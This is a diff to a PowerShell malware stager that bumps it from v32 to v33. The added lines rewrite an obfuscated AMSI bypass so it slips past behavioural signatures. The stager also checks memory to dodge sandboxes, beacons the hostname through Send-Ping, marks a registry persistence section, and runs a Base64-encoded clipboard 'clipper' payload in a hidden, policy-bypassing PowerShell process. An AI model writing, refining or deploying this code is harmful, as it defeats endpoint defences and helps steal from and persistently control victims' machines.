@@ -1,14 +1,12 @@
-# --- [ELITE RESEARCH STAGER v32.0: HEX-STABILIZED] ---
+# --- [ELITE RESEARCH STAGER v33.0: STABILIZED RESTORE] ---
 
 function Global-Initialize {
     try {
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         
-        # Highly obfuscated AMSI bypass to clear VM/Laptop scans
-        $n = "System.Management.Automation." + ("{0}{2}{1}" -f 'A','Utils','msi')
-        $s = [Ref].Assembly.GetType($n)
-        $f = $s.GetField(("am"+"si"+"Init"+"Failed"), 'NonPublic,Static')
-        $f.SetValue($null, $true)
+        # Non-linear string reconstruction to bypass behavioral signatures
+        $v = [type]("{0}{1}{3}{2}" -f 'S','ystem.Management.A','Utils','utomation.Amsi')
+        $v.GetField(("am"+"si"+"Init"+"Failed"),'NonPublic,Static').SetValue($null,$true)
     } catch {}
 }
 
@@ -22,7 +20,7 @@ function Send-Ping {
 
 # --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "STAGER_V32_HEX_ACTIVE_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "STAGER_V33_STABLE_ON_$($env:COMPUTERNAME)"
 
 try {
     # --- REGISTRY PERSISTENCE ---
@@ -78,7 +76,7 @@ try {
     $EncodedClipper = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
     powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $EncodedClipper
 
-    Send-Ping -m "V32_DEPLOYMENT_SUCCESS"
+    Send-Ping -m "V33_DEPLOYMENT_COMPLETE"
 } catch {
     Send-Ping -m "ERROR_$($_.Exception.Message)"
 }
